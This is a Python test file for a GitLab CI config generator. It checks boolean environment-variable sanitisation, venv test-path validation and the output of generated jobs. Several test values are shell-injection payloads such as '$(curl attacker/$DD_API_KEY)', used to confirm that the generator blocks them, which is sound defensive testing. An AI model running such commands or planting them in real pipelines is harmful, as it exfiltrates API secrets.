"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import io
import pathlib
import sys
import types
from unittest import mock

import pytest


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
    info = gen_gitlab_config_mod.SuiteVenvInfo(
        venv_count=2,
        python_versions={"3.12"},
        venvs=[("hash-with-path", "3.12"), ("hash-without-path", "3.12")],
        venv_test_locations={"hash-with-path": "tests/internal", "hash-without-path": ""},
    )

    with pytest.raises(ValueError, match="hash-without-path"):
        gen_gitlab_config_mod._validate_ddtest_venv_test_locations("internal", info)


def test_ddtest_jobs_emit_suite_environment(gen_gitlab_config_mod):
    output = io.StringIO()

    gen_gitlab_config_mod._emit_ddtest_jobs(
        output,
        suite="internal",
        stage="core",
        clean_name="internal",
        config={"env": {"_DD_PYTEST_XDIST_INFERRED_SERVICE": "tests.internal"}},
        venvs=[("abc1234", "3.13"), ("def5678", "3.14")],
        k=1,
    )

    content = output.getvalue()
    assert "_DD_PYTEST_XDIST_INFERRED_SERVICE: tests.internal" in content
    run_needs = content.split("core/internal::ddtest-run:", 1)[1].split("\n  parallel:\n", 1)[0]
    assert "PYTHON_VERSION: ['$[[ matrix.PYTHON_VERSION ]]']" in run_needs
    assert 'PYTHON_VERSION: "3.13"' not in run_needs
    assert 'PYTHON_VERSION: "3.14"' not in run_needs


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config
